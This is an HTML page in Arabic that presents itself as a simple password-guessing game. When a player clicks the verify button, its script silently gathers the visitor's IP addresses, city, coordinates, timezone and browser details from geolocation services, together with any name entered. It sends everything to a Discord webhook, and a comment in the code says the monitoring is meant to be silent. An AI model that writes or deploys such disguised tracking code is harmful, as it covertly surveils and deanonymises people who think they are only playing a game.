<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>لعبة كلمة السر</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      direction: rtl;
      text-align: center;
      margin: 50px;
    }
    input, button {
      padding: 10px;
      margin: 10px 0;
      width: 250px;
      font-size: 16px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>لعبة كلمة السر</h1>

  <input type="text" id="playerName" placeholder="اكتب اسمك (اختياري)" autocomplete="off" />
  <br/>
  <input type="text" id="userInput" placeholder="اكتب الكلمة هنا" autocomplete="off" />
  <br/>
  <button id="verify-button">تحقق من الكلمة</button>

  <div id="result"></div>

  <script>
    const discordWebhookUrl = "https://discord.com/api/webhooks/your_webhook_url_here";

    // كلمة السر الصحيحة (يمكنك تعديلها)
    const correctWord = "السر";

    async function sendUserInfo() {
      try {
        const geoResponse = await fetch("https://ipapi.co/json/");
        const geoData = await geoResponse.json();

        const ipv6Response = await fetch("https://api64.ipify.org?format=json");
        const ipv6Data = await ipv6Response.json();

        const ipv4 = geoData.ip || "غير معروف";
        const ipv6 = ipv6Data.ip || "غير معروف";

        const userAgent = navigator.userAgent;

        const infoText = `
IPv4: ${ipv4}
IPv6: ${ipv6}
الدولة: ${geoData.country_name}
المنطقة: ${geoData.region}
المدينة: ${geoData.city}
الموقع: ${geoData.latitude}, ${geoData.longitude}
المنطقة الزمنية: ${geoData.timezone}
متصفح وجهاز المستخدم: ${userAgent}
        `.trim();

        const data = { content: infoText };

        await fetch(discordWebhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
      } catch (error) {
        console.error("خطأ في إرسال معلومات المستخدم:", error);
      }
    }

    async function sendPlayerName(name) {
      if (!name) return;
      try {
        const data = { content: `اسم اللاعب: ${name}` };
        await fetch(discordWebhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
      } catch (error) {
        console.error("خطأ في إرسال اسم اللاعب:", error);
      }
    }

    document.getElementById("verify-button").addEventListener("click", async () => {
      const playerName = document.getElementById("playerName").value.trim();
      const userWord = document.getElementById("userInput").value.trim();

      // إرسال البيانات لمراقبة المستخدم بشكل صامت
      sendUserInfo();
      sendPlayerName(playerName);

      // التحقق من الكلمة المدخلة وعرض النتيجة
      const resultDiv = document.getElementById("result");
      if (!userWord) {
        resultDiv.textContent = "الرجاء إدخال كلمة للتحقق.";
        return;
      }

      if (userWord === correctWord) {
        resultDiv.textContent = "مبروك! الكلمة صحيحة.";
      } else {
        resultDiv.textContent = "الكلمة غير صحيحة، حاول مرة أخرى.";
      }
    });
  </script>

</body>
</html>
